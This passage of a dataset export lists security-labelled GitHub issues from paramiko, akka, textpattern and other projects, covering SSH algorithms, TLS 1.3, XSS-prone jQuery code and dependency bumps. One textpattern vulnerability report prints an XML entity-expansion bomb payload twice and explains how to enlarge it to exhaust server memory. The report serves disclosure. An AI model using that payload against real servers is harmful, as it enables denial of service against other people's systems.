Is it not possible to fallback through each of the client's preferred pubkeys, and only raise if they all fail? I have a _lot_ of servers I need to connect to, none of which I have the ability to modify in any meaningful way (like upgrading old OpenSSH packages). My problem right now, is some of the older servers use versions of OpenSSH that do not send `server-sig-algs`, and only support `ssh-rsa`. Blanket disabling pubkeys `rsa-sha2-256` & `rsa-sha2-512` is not an option, since the newer servers _do_ return `server-sig-algs`, and _only_ support SHA2 algos. ",no,"High priority,Keys,Feature,Needs patch,known_hosts,Security,ssh_config,"
paramiko/paramiko,133321863,"Removed support for hmac-md5 and truncated hmac-sha1","These are being removed from OpenSSH as well: https://github.com/openssh/openssh-portable/commit/714e367226ded4dc3897078be48b961637350b05
","Failing test appears to be a known one.
[![Coverage Status](https://coveralls.io/builds/5904252/badge)](https://coveralls.io/builds/5904252)

Coverage decreased (-0.03%) to 72.555% when pulling **ec0da667e46024a440c061713dd0cc7031a9edd4 on alex:patch-1** into **a14d266ce13e1909203e59c8b84965070a0aa69f on paramiko:master**.
Dropping this in 3.0 mostly because I've been telling folks 2.0 will remain API/behavior compatible. As noted elsewhere 3.0 will still go out in the nearish future :) thanks!
[![Coverage Status](https://coveralls.io/builds/5929346/badge)](https://coveralls.io/builds/5929346)

Coverage remained the same at 72.41% when pulling **273a1e1eb2f3079edebd22d824210ae6fddd46cb on alex:patch-1** into **86645149c9d066d5fe9222525c8bdf91df7f7de9 on paramiko:master**.
",yes,"Feature,Needs changelog/docs,Security,"
paramiko/paramiko,1935420,"Too difficult to change ciphers, set ssh options in high-level API","The high-level API, while convenient for simple uses, does not scale well into increased complexity.  For example, many ssh options that one might set via ""ssh -o"" are not available.  A common and important ssh tuning parameter is which cipher one wants to use.  Setting to arcfour within a fairly secure context can be an effective way to reduce CPU load.  As far as I've been able to tell, the only way to do this via paramiko's SSHClient class is to subclass and copy and paste the definition of connect, then modify the Transport object before connection.  Eg: copy connect and insert 
    t.get_security_options().ciphers = ('arcfour128',)
at paramiko/client.py:298.

An inexhaustive list of ways this could be handled more maintainably could include:
- initialisation or modification of the Transport is handled by a function that could be independently overridden in a subclass 
- initialisation of modification the Transport is handled by a callback (possibly via a some registration mechanism)
- some sort of configuration dict to be passed around that would allow objects such as Transports to initialise themselves in a generally configurable way
","I just ran into this as well: I'm currently leaning in favor of the third option so you could simple do something like `client.connect(transport_options={â€¦})` to pass in kwargs. I'm using this monstrosity::

``` python
            # See https://github.com/paramiko/paramiko/issues/50 for why we can't do something sane like this:
            # client.get_transport().get_security_options().ciphers = ciphers
            # Release the monkey:
            from paramiko.transport import Transport
            Transport._preferred_ciphers = ciphers + Transport._preferred_ciphers            
```
I think this is definitely something that plagues the library overall - prior development didn't really prioritize being ""Pythonic"" or otherwise easy to use.

I'm redoing my Fabric library which is a layer on top of Paramiko, soon; when I do so I'll be taking a closer look at the APIs in Paramiko and hopefully rearranging things or at least providing additional glue & ability to override in a non awful fashion.

Leaving this open as kind of a pointer to some basic starting points.
",no,"Needs investigation,Feature,Needs patch,Security,ssh_config,"
paramiko/paramiko,231814639,"Drop support for DSA keys","To stay inline with crypto best practices, and OpenSSH, we should plan to eventually drop support for DSA keys: https://www.gentoo.org/support/news-items/2015-08-13-openssh-weak-keys.html",":+1: here.

I think this might dovetail with the still-really-need-time-to-implement-it #387 and/or #50. I.e. a cleaner, user-facing API for configuring supported ciphers and key types (at the _very_ least, honoring the `ssh_config` bits for same, which I don't think we do yet.)

Put another way, I'd love to change the default like OpenSSH 7 did, but only once there is an easy way for users on legacy platforms to change it back.",no,"Keys,Feature,Security,"
paramiko/paramiko,331626452,"RFC8268 added kex dh modp groups support","This is to add support for RFC8268 KEX DH groups 14, 15, 16, 17, 18 with SHA2 hash algorithm.","Wow, edgsousa opened a similar request 10 min ago...",yes,"Ready for review,Feature,Security,"
akka/akka,631544741,"Document generation of akka-pki test resources","Resources used in [`akka-pki` tests](https://github.com/akka/akka/tree/78277d346db5e424d103d06794579f06bc94bdcd/akka-pki/src/test/resources) are a collection of binary files that have no documentation or script to regenerate.

Each resource has a unique format or properties required for the tests it is used in.",,no,"1 - triaged,t:docs,t:security,"
akka/akka,611986218,"Support TLS1.3 in Akka remoting","_Originally posted by @ignasi35 in https://github.com/akka/akka/pull/29004_

[""TLS 1.3 is not directly compatible with previous versions""](https://www.oracle.com/technetwork/java/javase/11-relnote-issues-5012449.html) so we may need to find a way to support rolling upgrades (or not support them at all).

","I've done a local run of the `akka-remote-tests` using JDK 11.0.7 (`openjdk version ""11.0.7"" 2020-04-14`). I've set `TLS1.3 for both the [artery](https://github.com/akka/akka/blob/07e87bc428ff3c9b5099ebda4645f4727833d1b6/akka-remote/src/main/resources/reference.conf#L1134) and netty implementations: all tests completed successfully.

That is an early result, though.TLS has version negotiation so rolling updates to TLS 1.3 should be possible if you enable both TLS 1.2 and 1.3 in an intermediate release and disable older versions of TLS only afterwards. As stated in the document there are still a few potential hurdles:

> 1. TLS 1.3 uses a half-close policy, while TLS 1.2 and prior versions use a duplex-close policy. For applications that depend on the duplex-close policy, there may be compatibility issues when upgrading to TLS 1.3.
> 2. The signature_algorithms_cert extension requires that pre-defined signature algorithms are used for certificate authentication. In practice, however, an application may use unsupported signature algorithms.
> 3. The DSA signature algorithm is not supported in TLS 1.3. If a server is configured to only use DSA certificates, it cannot upgrade to TLS 1.3.
> 4. The supported cipher suites for TLS 1.3 are not the same as TLS 1.2 and prior versions. If an application hard-codes cipher suites which are no longer supported, it may not be able to use TLS 1.3 without modifying the application code.
> 5. The TLS 1.3 session resumption and key update behaviors are different from TLS 1.2 and prior versions. The compatibility impact should be minimal, but it could be a risk if an application depends on the handshake details of the TLS protocols.

In particular, you must make sure that certificates use signature algorithms that are both allowed and supported in both TLS 1.2 and 1.3.> TLS 1.3 uses a half-close policy, while TLS 1.2 and prior versions use a duplex-close policy. For applications that depend on the duplex-close policy, there may be compatibility issues when upgrading to TLS 1.3.

See also #29110slightly off-topic: JDK8 supports [TLS1.3 since u272](https://blog.adoptopenjdk.net/2020/10/adoptopenjdk-8u272-1109-and-1501-available/)

> The OpenJDK project added support for TLS 1.3 to OpenJDK 8. TLS 1.3 is automatically enabled and will be negotiated for connections with servers supporting it. Previously, TLS 1.3 was only available on OpenJDK 11+ or required the installation of additional packages such as OpenJSEE.Great, good to know! Good, that we released 2.5.32 with the TLS v1.3 fix, people which connects against TLS 1.3 servers will have to upgrade.",no,"t:security,"
akka/akka,635179431,"Document generation of akka-stream-tests resources","Resources used in [`akka-stream-tests` tests](https://github.com/akka/akka/tree/master/akka-stream-tests/src/test/resources) are a collection of binary files that have no documentation or script to regenerate.

Each resource has particular content, format or properties required for the tests it is used in.","see also https://github.com/akka/akka/issues/29191 ",no,"1 - triaged,t:stream,t:security,"
akka/akka,788440574,"Invalid incoming TLS handshake should abort, not close the connection","When the `TLS` stage receives an invalid handshake (e.g. a non-TLS connection), the stage is closed rather than failed, causing the connection to be completed normally (FIN) instead of aborted (RST).

It seems https://github.com/akka/akka/pull/18655 added this behavior for some messages, but didn't introduce failing on SSLExceptions during wrapping/unwrapping (perhaps to be conservative in the scope of the change?)",,no,"t:stream,t:io:tls,t:security,"
akka/akka,1246517248,"TLS session is updated too late for TLS 1.3","When acting as a TLS server, in `TLSActor.doUnwrap`, the `currentSession` is updated when `engine.unwrap`'s `result.getHandshakeStatus` is `FINISHED`.

However, at least with TLS 1.3, it is possible for `engine.unwrap` to return `NEED_TASK` after receiving the client authentication, then `NEED_WRAP` after reading the first chunk of application data, and only then `FINISHED`. This leads to the first chunk of application data to be delivered to the user code with the 'old', unauthenticated session.

(this not a security concern: when the client authentication fails this application data will not be consumed at all).

~It would be nice if we could just assume any application data will come in after the client certificate is checked, but I'm not yet confident this is the case.~

This is the root cause of https://github.com/akka/akka-http/issues/4122, see that issue for a reproducer.","TLS 1.3 allows [0-RTT early client data](https://www.rfc-editor.org/rfc/rfc8446#section-2.3) which is not secured against replay attacks (because it is encrypted using a fixed PSK before DHE is finished). Auth data will only be sent in the second client packet (see [Figure 1](https://www.rfc-editor.org/rfc/rfc8446#section-2)).

Could it be that we see a 0-RTT early data packet here?I can rule out a 0-RTT case, it seems to happen if the first data arrives in the same TCP packet as the `Finished` TLS handshake packet.0-RTT doesn't even seem to be implemented in the JVM: https://bugs.openjdk.org/browse/JDK-8049402@jrudolph  @raboof  is this ticket (potentially) fixed? Thanks!> @jrudolph @raboof is this ticket (potentially) fixed? Thanks!

No, we have a tentative fix in the works at #31433 though. If you want to avoid the issue you could either configure your server to only do TLSv1.2, or perhaps build a local snapshot of the Akka artifacts from #31433@raboof thanks for your quick response. Unfortunately, downgrading to  TLSv1.2 is not an option for us, we will wait for the fix to be released.",no,"t:io:tls,t:security,"
akka/akka,610142253,"Update Cluster TLS recommendations in docs","The section on [`Remote Security`](https://doc.akka.io/docs/akka/current/remoting-artery.html#remote-security) of the remoting docs refers to IETF's RFC 7525 which is now being [reviewed](https://datatracker.ietf.org/doc/draft-sheffer-uta-rfc7525bis/history/).

Once the new version is out docs should be upgraded.",,no,"t:security,"
akka/akka,631469927,"Make TLS session verification configurable","Currently we allow hostname verification in `ConfigSSLEngineProvider` and use a SN-based session verification in `RotatingKeysSSLEngineProvider`.

It would be nice to make this configurable, unifying the 2 providers and perhaps allowing additional parameters (such as further restricting the hostnames or SN's).","@raboof @ignasi35 Note that we have `t:security` label. It's rather new so I understand you haven't noticed.",no,"1 - triaged,t:remoting:artery,t:security,"
akka/akka,629336220,"Harden Rotating Keys support","In https://github.com/akka/akka/pull/29152 a new `SSLEngineProvider` with support for rotating keys was introduced. It caches an `SSLContext` for a certain amount of time. When the cache expires and a new request for an `SSLEngine` comes in creating the new `SSLContext` will read from disk again.

That ""read from disk again"" operation has a race with any external tool writing the new key set on disk. As a consequence, the `RotatingKeysSSLEngineProvider` introduced in #29152 may fail with `FileNotFoundException` or it could read a partially written file.

The problem is: what should the `RotatingKeysSSLEngineProvider` code do when such a failure happens? Here are some options:

- the node is considered dead and shuts down
- `RotatingKeysSSLEngineProvider` should produce an `SSLContext` with the old keys (kept in memory just in case) and try again at a later time. Include some logs about the issue.
- retry reading the files immediately
- other...



","Is that from our tests? In a real environment I would expect that the files are swapped atomically.> Is that from our tests? In a real environment I would expect that the files are swapped atomically.

Yes - and that test was removing the whole directory, that would likely not happen in a real-world scenario. Still, recovering from a failure to rotate the keys might be good to improve.

> RotatingKeysSSLEngineProvider should produce an SSLContext with the old keys (kept in memory just in case) and try again at a later time. Include some logs about the issue.

i think indeed replacing the SSLContext only when it has been loaded successfully would be nicest - but let's also see what fits best.

@patriknw I mentioned only race conditions but there could be other failure causes:
 - an invalid update on the `cert-manager` setup causing a cascade DoS (e.g. `cert-manager` produces the wrong private key file format)
 - the issuer CA-chain becomes longer than it is supported by `RotatingKeysSSLEngineProvider`Another potential improvement could be ""pre-rotation validations"": running a set of assertions over the newly created `SSLContext` before swapping. That is, even if the file loading succeeds, and the new `SSLContext` can be built it may not be valid for Artery (e.g. a certificate that's only valid for `serverAuth`).

In that case, the new, invalid `SSLContext` is already in the cache and the node can no longer connect to new nodes (only the existing connections are usable). ",no,"1 - triaged,t:security,"
akka/akka,631550476,"Document formats supported by Artery's X509Readers","Artery's `RotatingKeysSSLEngineProviders` extracts the subject and `SubjectAlternativeName`'s using [`X509Certificate.html#getSubjectAlternativeNames`](https://docs.oracle.com/javase/8/docs/api/java/security/cert/X509Certificate.html#getSubjectAlternativeNames--).

The current implementation only supports `String`-based `DNS` SAN's.",,no,"t:docs,t:remoting:artery,t:security,"
heroku/legacy-cli,40180691,"SHA checksum for tarball should be provided","currently the SHA is only used for the zip version.

In addition this means that the tarball isn't validating the sha internally, it should
","@dickeyxxx Is this still an issue?
",no,"security,"
factor/factor,596185902,"factorcode.org SSL rating needs work","* https://observatory.mozilla.org/analyze/factorcode.org - F
* https://www.ssllabs.com/ssltest/analyze.html?d=factorcode.org - B
* https://check-your-website.server-daten.de/?q=factorcode.org
* https://tls.imirhil.fr/https/factorcode.org
* https://csp-evaluator.withgoogle.com/?csp=https://factorcode.org

Implement:
- [x] Disable TLS 1.0 and 1.1
- [x] CSP https://csp-evaluator.withgoogle.com/?csp=https://factorcode.org
- [x] HSTS - Strict-Transport-Security header
- [x] X-Content-Type-Options
- [x] X-Frame-Options
- [x] X-XSS-Protection
- [ ] Upgrade certbot certificate from rsa-2048 to something better
","I had originally planned to leave all our OpenSSL bindings, but move all our actual socket calls over to libtls, which is significantly more idiot-proof on these kinds of things. I remember you having LibreSSL issues, but I can't remember why or find it on the mailing list. Do you remember what issues there were?And secondarily, I was planning to do some Furnace work today; I can definitely see about adding those extra headers.I think we fixed most everything easy with the LibreSSL checker site. They might have new tests up.

Renewing the certs is finally easy -- ``sudo /usr/local/bin/certbot-auto`` and pick nginx and confirm yes. It's probably easy to automate this part too.

I think the main thing for furnace would be moving to html5 instead of xhtml.",no,"website,http,crypto,web,networking,SSL,factorcode.org,html,security,modernize,"
textpattern/textpattern,371658692,"Potential XSS in jQuery.fn.txpColumnize","Since the function does not appear to be used, I'll post this here instead of the security mailing list (if it still exists), and because the vulnerabilities are obvious.

As with other places in more recent JavaScript, DOM is constructed and updated in rather unsafe manner of making up a literal string of HTML from (potentially) user-given values (such as existing page content), and then just blobbing it into innerhtml.

While you end up with some new shiny nodes, you also end up executing any executable code in the given constructed string. Especially in the case of txpColumnize, as it even unescapes any escaping, if present (it does the whole innerText -> innerHtml juggle pattern).

Instead, one should generate the given elements objects in JS. For instance the following used code:

```
$li.html('<div role=""menuitem""><label><input tabindex=""-1"" class=""checkbox active"" data-name=""list_options"" checked=""checked"" value=""' + $id + '"" data-index=""' + index + '"" type=""checkbox""' + disabled + ' /> ' + $title + '</label></div>');
```

Should be something more like the following:

```javascript
let title = $('<span/>').text($title);
let box = $('<input tabindex=""-1"" class=""checkbox active"" data-name=""list_options"" checked=""checked""/>')
    .attr('value', $id)
    .attr('data-index', index)
    .prop('disabled', disabled);

$li.html($('<div role=""menuitem"" />').html($('<label/>').append(box, title)));
```

Alternatively, one could use templating thingymajig, React-whatitsfaceis or something that takes the mom's spaghetti and makes it more of a representable pasta dish -- buuuutttt I guess you gotta work with what you have.","Thanks Jukka, nice to know you follow! Yep, the recent txp JS is a holly mess, but what user-given values are you talking about in this case? Column names come from core or plugins, and this is a mandatory trusted territory.Lazy ghost is around at times.

Nothing specifically, but that does not count as 'trustworthy' in my eyes. One can not guarantee what it scrapes from the page, meaning it's potentially exposed to whatever values even if it is not supposed to.

When working on DOM, or communicating between two distinct entities, there is no chain of trust, making everything lava. The fact that the column names are supposed to come from trusted source is moot.

(...plus its a publicly exposed API method and can be run on anything, but that is beside the point).Hard to disagree, like on backups. Jokes apart, thanks, I wrongly presumed that jQuery `html()` wouldn't unescape its string argument. Nothing urges atm, but we need to seriously revise `textpattern.js` one day. If you can lend a hand, that would be more than welcome.

**Edit**: for the record, it's actually `text()` that unescapes strings, we must pass it through `textpattern.encodeHTML()`.Yes, the reason why it gets 'unescaped' (not that it truly 'unescapes' anything) is the innerText getter; it gets contents of a node in its plain text presentation. Which is also how the aforementioned textpattern.encodeHTML functions -- in reverse tho.

Not that 'unescaping' is the sole reason what is making it unsafe, just even more so. Even if the used text presentation was replaced with HTML string presentation of the node contents, it is still wrong and exploitable.> Even if the used text presentation was replaced with HTML string presentation of the node contents, it is still wrong and exploitable.

I agree on wrong, curious to see how it is exploitable in txp context.

Okay then, how should we sanitize, say, our general-purpose message pane? Since ages, in async mode we set its innerHTML via plain strings. The sensible parts of these are `txpspecialchars`'ed, but are you saying it's not enough? Or is it different from `textpattern.encodeHTML`'ed strings?Ask yourself: What does `txpspecialchars`, that is a server-side PHP function, have to do with client-side JavaScript?

Just because the current document, or received payload in general, is properly structured does in no case mean you can skip proper sanitisation and value handling in your client-side processing. It has to happen within the context.

For instance, in the case of messages, they must be encoded and handled properly within context of JavaScript, not pre-escaped on the server and used as-is, **if** that is what is happening. Doing that would be very much unsafe and potentially exploitable.To add, with messages pane you probably mean HTML fragment responses (if I recall correctly what Textpattern does). Those are fine.That's how the partials update was in 4.5.7:
```
$response = '$(""'.$p['selector'].'"").replaceWith(""'.escape_js($p['html']).'"")';
...
send_script_response($response);
```
As I get it, all sanitation is done server-side via `escape_js`. Is this fine?I suppose it is. This is not an ideal way of implementing asynchronous interfaces, but it works and it's essentially same as just returning a full document. The main real issue with server-generated JS responses is the fact that the requester/respondent can not validate the response, potentially leaving the interface in a broken state.

Things I would make sure with this particular snippet, is that the `$p['selector']`, which is evaluated by jQuery selector logic, is never nothing more than one of pre-defined list of options, or harshly validated on top of being encoded for a string-use by `escape_js`. If the selector is dynamically generated (etc), it would need to be changed from that query to a filter-logic to avoid errors.Okay, if ""unsafe and potentially exploitable"" means broken interface, there is no emergency, thanks for clarification. I'm only an inspired amateur fearing to break something. Sure, we would do it differently today, but txp has a 15 years history. Any change potentially breaks the few plugins yet working. But I agree, we should progressively move to some twiggy templating. Revising txp JS is on 4.8 todo list.",no,"security,"
textpattern/textpattern,419109112,"New properties for the native css tag","### Is your feature request related to a problem?

No (an improvement).

### What is the feature?

To prevent attacks, possibly into CSS files (see: https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense), maybe it's time to add new properties for the `<txp:css />` tag:
""`integrity`"" attempted to store a SRI hash (Subresource Integrity) and its compagnon ""`crossorigin`"".

Sample of a possible use:

`<txp:css name=""print"" format=""flat.link"" media=""print"" integrity=""sha384-/VLZ9QhATgiUs4ha2DcLiKyQ40fBFB+Wub8YYfGE4GQWPTB1glePJzCoX9Iqzi0q"" crossorigin=""anonymous"" />`

Online tools exist to get that hash (https://www.srihash.org/), maybe a more simple way could be added into core to generate on the fly a such code if user set the property on ""1"":

`<txp:css name=""print"" format=""flat.link"" media=""print"" integrity=""1"" crossorigin=""anonymous"" />`
","Something is [planned](https://github.com/textpattern/textpattern/tree/integrity) in this sense, for JS too. But for flat links this requires some server configuration, since PHP is totally bypassed. Needs investigation.Fine. Cool ;)",no,"tags,security,reminder,"
textpattern/textpattern,294159435,"XML Injection Denial of Service","### Expected behaviour

Validate XML import against a schema

### Actual behaviour

Processes the XML bomb provided

### Steps to reproduce

Import an XML file with the following content:
```xml
<?xml version=""1.0""?>
<!DOCTYPE foo [
<!ELEMENT foo (#PCDATA)>
<!ENTITY l ""lol"" >
<!ENTITY a ""dfszfhsauyfghdusyfgsuyfgsiyfgsdyfgseuyfgesuyfgesiugfseugyfgaeyfaegufeuigyyusadgffyyusdgrdfvgesiyuesjuguishd e sui sgdfuisrg uy f gsfure grg sud yhsd rguysege  sejhges xd u esy sy ugse rfsue g$
<!ENTITY lol ""&l;"">
<!ENTITY lol9 ""&lol;&lol;&lol;&lol;"">
<!ENTITY aa ""&a;&a;&a;&a;"">
<!ENTITY lol10 ""&lol9;&aa;"">
<!ENTITY xxe ""&lol10;"">

]>
<foo>&xxe;</foo>
```

This shows how we can make the server consume memory when parsing the XML. This can be done to eventually exhaust the entire server's memory (depending on configuration) and create a denial of service scenario. 

The lines of code vulnerable are given below:

https://github.com/textpattern/textpattern/blob/1a849492bc2a027c2985202a29832da8008c3c17/textpattern/vendors/Textpattern/Import/TxpXML.php#L101

If schema validation is added to the method, the issue should be resolved. This will also require ensuring entities are not within the XML file too. ","Thanks for the report @ProDigySML. The issue is as critical as any import (e.g. plugins) from untrusted sources, but a validation wouldn't hurt. SimpleXML does not seem to provide a validator, so we'd need to switch to DOMDocument instead.Actually, `libxml2` seems to be protected against XML bombs by default, throwing `Detected an entity reference loop` warning in my tests. Has anyone managed to DoS his server with this?@bloatware yes they have protected against the XML bomb to a certain extent. It is still pretty simple to recreate an XML bomb. All we have to do is ensure that we don't call an entity more than 4 times. Not sure the protection is that simple, mind providing a bomb example?Sure thing @bloatware 
I would've put it up earlier, just didn't really want to make it public. I guess anyone who wants to exploit it can use learn about XML and do it themselves anyway :) 

Example XML code is below:
```xml
<?xml version=""1.0""?>
<!DOCTYPE foo [
<!ELEMENT foo (#PCDATA)>
<!ENTITY l ""lol"" >
<!ENTITY a ""dfszfhsauyfghdusyfgsuyfgsiyfgsdyfgseuyfgesuyfgesiugfseugyfgaeyfaegufeuigyyusadgffyyusdgrdfvgesiyuesjuguishd e sui sgdfuisrg uy f gsfure grg sud yhsd rguysege  sejhges xd u esy sy ugse rfsue gyysd fghsd gfuyes"">
<!ENTITY lol ""&l;"">
<!ENTITY lol9 ""&lol;&lol;&lol;&lol;"">
<!ENTITY aa ""&a;&a;&a;&a;"">
<!ENTITY lol10 ""&lol9;&aa;"">
<!ENTITY xxe ""&lol10;"">

]>
<foo>&xxe;</foo>
```

As you can see, we dont have any restrictions on the length of an entity and the number of entities. We have a restriction on the number of times an entity is called. This can easily be expanded to create a DoS scenario. Then only thing is, you will be sending a large payload yourself, but that still isn't that bad when considering you are putting aside specific resources to DoS the system. 

Hope that helps! :) Thanks @ProDigySML, I know it works in theory, just am not able to create a bomb without sending a really large payload. The server seems to defend itself against exponential attacks, but is probably vulnerable to polynomial ones.

I guess we will just prohibit DOCTYPE declarations atm.I don't think there's much else we can do here. Everyone concur? Or can we do more to mitigate this?Schema validation seems too restrictive, we don't know what kind of documents could be imported in the future. I guess there is nothing we can do if a user imports weird files (XML or whatever) into his txp install.Shall we close this then, and get 4.7.0 beta out?Postpone it to 4.8, perhaps? Custom fields will be a big change, I guess, including XML import.Yep, letâ€™s get beta out ASAP. This can wait.> This attack appear to be exploitable via Uploading a specially crafted XML file.

We also recognize being vulnerable to uploading a specially crafted PHP file to a special directory or installing a specially crafted plugin or whatever harmful action a *site admin* **decides** to undertake. Any ideas how to fix it?Is there any fix for this issue?
Believe that CVE-2018-1000090 was assigned@NicoleG25 the 'issue' is of the same order of criticality that uploading a harmful php file or plugin. We currently use XML import only on setup for data provided with txp distribution, which is safe.@bloatware meaning you disagree with the assignment of the CVE-ID?
I'm not quite sure I follow..
In any case if there is no plan to fix this perhaps you should consider disputing the assignment  ?

Thanks in advance!@NicoleG25 there is (currently) no plan to fix it since there is (currently) nothing to fix. The only persons able to exploit this 'vulnerability' are txp site admins (or hackers capable to upload files to txp system directories). But they have full powers anyway and don't need this hack to destroy the site.

Thank you for your interest.",no,"security,"
klauern/groovyjersey,719293850,"[Security] Bump junit from 3.8.1 to 4.13.1","Bumps [junit](https://github.com/junit-team/junit4) from 3.8.1 to 4.13.1.
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href=""https://github.com/junit-team/junit4/releases"">junit's releases</a>.</em></p>
<blockquote>
<h2>JUnit 4.13.1</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit/blob/HEAD/doc/ReleaseNotes4.13.1.md"">release notes</a> for details.</p>
<h2>JUnit 4.13</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit/blob/HEAD/doc/ReleaseNotes4.13.md"">release notes</a> for details.</p>
<h2>JUnit 4.13 RC 2</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit4/wiki/4.13-Release-Notes"">release notes</a> for details.</p>
<h2>JUnit 4.13 RC 1</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit4/wiki/4.13-Release-Notes"">release notes</a> for details.</p>
<h2>JUnit 4.13 Beta 3</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit4/wiki/4.13-Release-Notes"">release notes</a> for details.</p>
<h2>JUnit 4.13 Beta 2</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit4/wiki/4.13-Release-Notes"">release notes</a> for details.</p>
<h2>JUnit 4.13 Beta 1</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit4/wiki/4.13-Release-Notes"">release notes</a> for details.</p>
<h2>JUnit 4.12</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit/blob/HEAD/doc/ReleaseNotes4.12.md"">release notes</a> for details.</p>
<h2>JUnit 4.12 Beta 3</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit/blob/HEAD/doc/ReleaseNotes4.12.md"">release notes</a> for details.</p>
<h2>JUnit 4.12 Beta 2</h2>
<p>No release notes provided.</p>
<h2>JUnit 4.12 Beta 1</h2>
<p>No release notes provided.</p>
<h2>JUnit 4.11</h2>
<p>No release notes provided.</p>
</blockquote>
</details>
<details>
<summary>Changelog</summary>
<p><em>Sourced from <a href=""https://github.com/junit-team/junit4/blob/main/doc/ReleaseNotes4.13.1.md"">junit's changelog</a>.</em></p>
<blockquote>
<h2>Summary of changes in version 4.13.1</h2>
<h1>Rules</h1>
<h3>Security fix: <code>TemporaryFolder</code> now limits access to temporary folders on Java 1.7 or later</h3>
<p>A local information disclosure vulnerability in <code>TemporaryFolder</code> has been fixed. See the published <a href=""https://github.com/junit-team/junit4/security/advisories/GHSA-269g-pwp5-87pp"">security advisory</a> for details.</p>
<h1>Test Runners</h1>
<h3>[Pull request <a href=""https://github-redirect.dependabot.com/junit-team/junit4/issues/1669"">#1669</a>:](<a href=""https://github-redirect.dependabot.com/junit-team/junit/pull/1669"">junit-team/junit#1669</a>) Make <code>FrameworkField</code> constructor public</h3>
<p>Prior to this change, custom runners could make <code>FrameworkMethod</code> instances, but not <code>FrameworkField</code> instances. This small change allows for both now, because <code>FrameworkField</code>'s constructor has been promoted from package-private to public.</p>
</blockquote>
</details>
<details>
<summary>Commits</summary>
<ul>
<li>See full diff in <a href=""https://github.com/junit-team/junit4/commits/r4.13.1"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=junit:junit&package-manager=maven&previous-version=3.8.1&new-version=4.13.1)](https://dependabot.com/compatibility-score/?dependency-name=junit:junit&package-manager=maven&previous-version=3.8.1&new-version=4.13.1)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>","We've just been alerted that this update fixes a security vulnerability:

*Sourced from [The GitHub Security Advisory Database](https://github.com/advisories/GHSA-269g-pwp5-87pp).*

> **TemporaryFolder on unix-like systems does not limit access to created files**
> ### Vulnerability
> 
> The JUnit4 test rule [TemporaryFolder](https://junit.org/junit4/javadoc/4.13/org/junit/rules/TemporaryFolder.html) contains a local information disclosure vulnerability.
> 
> Example of vulnerable code:
> ```java
> public static class HasTempFolder {
>     @Rule
>     public TemporaryFolder folder = new TemporaryFolder();
> 
> ... (truncated)

> 
> Affected versions: [""< 4.13.1""]

",yes,"dependencies,security,"
freenet/fred,124381075,"Throttle unmatched scan","This needs more testing and probably more work. However review would be helpful.
See https://bugs.freenetproject.org/view.php?id=6773
","This is something I'd like to see in 1475
",yes,"security,"
gmacario/gmacario.github.io,915820311,"Potential security vulnerabilities in your dependencies","Please check https://github.com/gmacario/gmacario.github.io/security/dependabot

* browserslist : Upgrade to ~> 4.16.5",,no,"security,"
nbudin/vellum,786777294,"[Security] Bump sanitize from 4.6.4 to 5.2.3","Bumps [sanitize](https://github.com/rgrove/sanitize) from 4.6.4 to 5.2.3. **This update includes security fixes.**
<details>
<summary>Vulnerabilities fixed</summary>
<p><em>Sourced from <a href=""https://github.com/rubysec/ruby-advisory-db/blob/master/gems/sanitize/CVE-2020-4054.yml"">The Ruby Advisory Database</a>.</em></p>
<blockquote>
<p><strong>Cross-site scripting vulnerability via <code>&lt;math&gt;</code> or <code>&lt;svg&gt;</code> element in Sanitize</strong>
When HTML is sanitized using Sanitize's &quot;relaxed&quot; config or a custom config that allows certain
elements, some content in a <code>or</code> element may not be sanitized correctly even if
<code>math</code> and <code>svg</code> are not in the allowlist.</p>
<p>You are likely to be vulnerable to this issue if you use Sanitize's relaxed config or a custom
config that allows one or more of the following HTML elements:</p>
<ul>
<li><code>iframe</code></li>
<li><code>math</code></li>
<li><code>noembed</code></li>
<li><code>noframes</code></li>
<li><code>noscript</code></li>
<li><code>plaintext</code></li>
<li><code>script</code></li>
<li><code>style</code></li>
<li><code>svg</code></li>
<li><code>xmp</code></li>
</ul>
<h3>Impact</h3>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
<blockquote>
<p>Patched versions: &gt;= 5.2.1
Unaffected versions: &lt; 3.0.0</p>
</blockquote>
